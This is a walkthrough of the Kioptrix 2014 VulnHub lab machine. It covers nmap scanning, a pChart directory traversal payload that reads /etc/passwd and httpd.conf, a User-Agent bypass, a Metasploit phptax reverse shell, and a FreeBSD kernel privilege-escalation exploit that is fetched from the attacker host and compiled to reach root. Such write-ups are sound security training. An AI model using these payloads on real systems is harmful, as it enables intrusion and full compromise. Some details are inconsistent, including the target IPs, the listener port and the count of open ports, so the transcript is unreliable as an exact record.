# Kioptrix 2014 | VulnHub Walkthrough

> **Platform:** VulnHub  
> **Difficulty:** Beginner → Intermediate  
> **Goal:** Get Root  

---

Welcome to my walkthrough of the **Kioptrix 2014** vulnerable machine! As part of my journey in ethical hacking and cybersecurity, I tackled this machine to sharpen my skills in penetration testing and vulnerability assessment. Kioptrix 2014 is designed to simulate real-world vulnerabilities, making it a valuable learning resource for both aspiring and experienced security professionals.

In this guide, I'll walk you through every step I took to identify and exploit the vulnerabilities — with detailed explanations along the way. Whether you're preparing for certifications like CEH or OSCP, or simply want to level up your skills, this walkthrough has you covered. Let's dive in! 🚀

---

## Step 1 — Discovering the Target IP

After booting up the Kioptrix machine, the first thing I did was use the `netdiscover` command to find its IP address on the network.

```bash
netdiscover
```

This scanned my local subnet and returned the target machine's IP address — **192.168.1.123** (yours may differ depending on your setup).

📸 Screenshot:
https://github.com/Salik921/-Kioptrix-2014-Walkthrough/blob/25f173b7bc30acedb1d943c496b7a594a8ffed20/Screenshor/Screenshot%202026-06-16%20122153.png

---

## Step 2 — Port Scanning with Nmap

Now that I had the IP, I ran an **aggressive scan** using Nmap to identify open ports and the services running on them.

```bash
nmap -sS -sV -sC -O 192.168.10.5
```

-sS = SYN scan (stealthy "half-open" port scan, the default and fastest TCP scan type)
-sC = run default Nmap scripts against discovered ports (banner grabbing, basic vuln/info checks)
-sV = detect service/version info running on open ports
-O = attempt OS detection (guesses the target's operating system)

**Results:**

```
PORT     STATE SERVICE VERSION
22/tcp   Closer  ssh     OpenSSH
80/tcp   open  http    Apache httpd
8080/tcp open  http    Apache httpd
```
📸 Screenshot:
https://github.com/Salik921/-Kioptrix-2014-Walkthrough/blob/ab6a9f0d81fa44e14718775320de244d62bea989/Screenshor/Screenshot%202026-06-16%20122320.png

Three ports were open:
- **Port 80** — HTTP (web server)
- **Port 8080** — HTTP (another web instance)

Since HTTP is running on both ports, let's check the web pages.

---

## Step 3 — Web Enumeration

### Port 80

Opening `http://192.168.10.5 in the browser showed a basic default page — nothing interesting at first glance.

📸 Screenshot:
https://github.com/Salik921/-Kioptrix-2014-Walkthrough/blob/53502fb7762074291d1f99ac94d3700648fecabc/Screenshor/Screenshot%202026-06-16%20122418.png


But before giving up, I always check the **page source code**. And there it was — a commented-out URL pointing to a **pChart** directory.

📸 Screenshot:
https://github.com/Salik921/-Kioptrix-2014-Walkthrough/blob/e9449a38cb73e42be547fd821aa1b5e70cceaecf/Screenshor/Screenshot%202026-06-16%20122532.png


```
/pChart2.1.3/examples/index.php
```

**What is pChart?**

pChart is a PHP-based charting library used to create charts and graphs for web applications. The examples directory was left exposed — a classic misconfiguration.

Navigating to the URL showed a PHP application file listing.

### Port 8080

Opening `http://192.168.10.5:8080` returned a **403 Forbidden** error.

Interesting. Something is blocking access here. We'll come back to this.

---
📸 Screenshot:
https://github.com/Salik921/-Kioptrix-2014-Walkthrough/blob/e9449a38cb73e42be547fd821aa1b5e70cceaecf/Screenshor/Screenshot%202026-06-16%20122450.png

## Step 4 — Exploiting pChart 2.1.3 — Directory Traversal

I searched for known vulnerabilities in pChart 2.1.3 and found it on **Exploit-DB** — there are two exploits:

1. **Directory Traversal**
2. XSS

XSS wouldn't be useful here, so I went with the **Directory Traversal**.

**Why Directory Traversal?**

The flaw in pChart allows an attacker to read sensitive files outside the web root. The server executes pChart with elevated privileges, meaning we can access files like `/etc/passwd`, config files, and more — all by manipulating the `Script` URL parameter.

**Payload:**

```
http://192.168.10.5/pChart2.1.3/examples/index.php?Action=View&Script=%2f..%2f..%2fetc/passwd
```

**URL Decoded:** `Script=../../etc/passwd`

The `%2f` is URL encoding for `/`. By chaining `../` sequences, we navigate up the directory tree and reach `/etc/passwd`.

This returned the contents of the passwd file — confirming the vulnerability. ✅

---

## Step 5 — Reading the Apache Config

Now I needed to understand **why port 8080 was returning 403**. The answer would be in the Apache configuration file.

Using the same Directory Traversal trick, I read the Apache config:

```
http://192.168.10.5/pChart2.1.3/examples/index.php?Action=View&Script=%2f..%2f..%2fusr/local/etc/apache22/httpd.conf
```

Inside the config, I found this line:

```
SetEnvIf User-Agent "^Mozilla/4\.0" allow_8080
Order Deny,Allow
Deny from all
Allow from env=allow_8080
```

**The reason for 403:** Port 8080 only allows connections from browsers with a **Mozilla/4.0 User-Agent**. Since modern browsers use different User-Agent strings, we get blocked.

---

## Step 6 — Bypassing the User-Agent Restriction

To access port 8080, I needed to change my browser's User-Agent to `Mozilla/4.0`.

I used **Burp Suite** to intercept the request and manually modify the User-Agent header.

**Steps:**

1. Open Burp Suite and turn on **Intercept** under the Proxy tab
2. Open the browser (configured to use Burp as proxy) and navigate to `http://192.168.1.123:8080/`
3. Burp captures the request — you'll see something like:

```
GET / HTTP/1.1
Host: 192.168.1.123:8080
User-Agent: Mozilla/5.0 (X11; Linux x86_64) ...
Accept: text/html
...
```

4. Change `Mozilla/5.0` to `Mozilla/4.0`:

```
GET / HTTP/1.1
Host: 192.168.10.5:8080
User-Agent: Mozilla/4.0
Accept: text/html
...
```

5. Click **Forward** to send the modified request

The server accepted it and returned the directory listing with a folder named **phptax**. ✅

**What is phptax?**

PHPTax is an open-source PHP web application for tax calculations. It's old and unmaintained — perfect conditions for vulnerabilities.

---

## Step 7 — Exploiting phptax — Remote Code Execution

I searched for phptax exploits and found one available directly in **Metasploit**.

Let's fire up msfconsole:

```bash
msfconsole
```

Search for the exploit:

```bash
msf > search phptax
```

Use the exploit:

```bash
msf > use exploit/multi/http/phptax_exec
```

Set the required options:

```bash
msf > set LHOST 192.168.10.9   # Your Kali IP
msf > set LPORT 8686
msf > set RHOSTS 192.168.10.5  # Target IP
msf > set RPORT 8080
```

**Important — Set the User-Agent:**

Since the server only accepts Mozilla/4.0, we must set it in the exploit too, otherwise it won't work:

```bash
msf > set HttpUserAgent Mozilla/4.0
```

Now select the right payload:

```bash
msf > show payloads
msf > set payload cmd/unix/reverse
```

Run the exploit:

```bash
msf > run
```

**Result:**

```
[*] Started reverse TCP handler on 192.168.1.100:4444
[*] Sending request...
[*] Command shell session 1 opened
```

We have a shell! Let's verify:

```bash
$ whoami
www
```

We're in as the `www` user. Time for privilege escalation. 🔼

---

## Step 8 — Post-Exploitation & Privilege Escalation

### Check the Kernel

```bash
$ uname -a
FreeBSD kioptrix2014 9.0-RELEASE
```

**What is uname -a?**

The `uname -a` command reveals detailed system information — including the **kernel name and version**. This is crucial for finding local privilege escalation exploits.

The target is running **FreeBSD 9.0** — which has a known local privilege escalation vulnerability.

### Find the Exploit

On Kali (in a new terminal), I searched for FreeBSD exploits:

```bash
searchsploit FreeBSD 9.0 privilege escalation
```

Found it — **28718.c** — Intel SYSRET Kernel Privilege Escalation (CVE-2012-0217).

### Transfer the Exploit to Target

Copy the exploit to a working directory:

```bash
cp /usr/share/exploitdb/exploits/freebsd/local/28718.c ~/Desktop/exploits/
cd ~/Desktop/exploits/
```

Host a Python HTTP server:

```bash
python3 -m http.server 8000
```

Back in the reverse shell, navigate to `/tmp` and download the exploit:

```bash
$ cd /tmp
$ fetch http://192.168.1.100:8000/28718.c
```

Or use curl/nc if fetch isn't available:

```bash
$ curl http://192.168.1.100:8000/28718.c -o 28718.c
```

### Compile and Run

Compile the exploit with `gcc`:

```bash
$ gcc 28718.c -o privesc
```

Give it execute permission:

```bash
$ chmod +x privesc
```

Run it:

```bash
$ ./privesc
```

Check privileges:

```bash
$ whoami
root
```

---

## 🎉 Root!

```
uid=0(root) gid=0(wheel) groups=0(wheel)
```

**We are Root!** 🔥

---

## Root Flag

```bash
# cat /root/congrats.txt
```

```
If you are reading this, it means you got root (or cheated).
Congratulations either way :)

Hope you enjoyed Kioptrix VM #5.
```

---

## Lessons Learned

| # | Lesson |
|---|--------|
| 1 | Always check **page source** — the pChart path was hidden in an HTML comment |
| 2 | **LFI/Directory Traversal** can expose server configs and sensitive files |
| 3 | **User-Agent filtering is not real security** — it's trivially bypassed |
| 4 | Outdated web apps like phptax have **public RCE exploits** |
| 5 | Always run `uname -a` — kernel version often leads to local privesc |
| 6 | **Enumerate all ports** — port 8080 was the real entry point |

---

## Tools Used

| Tool | Purpose |
|------|---------|
| `netdiscover` | Host discovery |
| `nmap -A` | Aggressive port & service scan |
| `Browser + UA Switcher` | Bypass User-Agent restriction |
| `Metasploit (msfconsole)` | phptax RCE exploitation |
| `searchsploit` | Finding local privesc exploit |
| `python3 -m http.server` | Hosting exploit file |
| `gcc` | Compiling C exploit on target |
| `chmod` | Setting execute permissions |

---

## References

- [VulnHub — Kioptrix 2014](https://www.vulnhub.com/entry/kioptrix-2014-5,62/)
- [Exploit-DB — pChart Directory Traversal](https://www.exploit-db.com/exploits/31173)
- [Exploit-DB — phptax RCE](https://www.exploit-db.com/exploits/21665)
- [Exploit-DB — FreeBSD 9.0 LPE (28718)](https://www.exploit-db.com/exploits/28718)

---

<p align="center">Made with ❤️ | Happy Hacking 🐱‍💻</p>
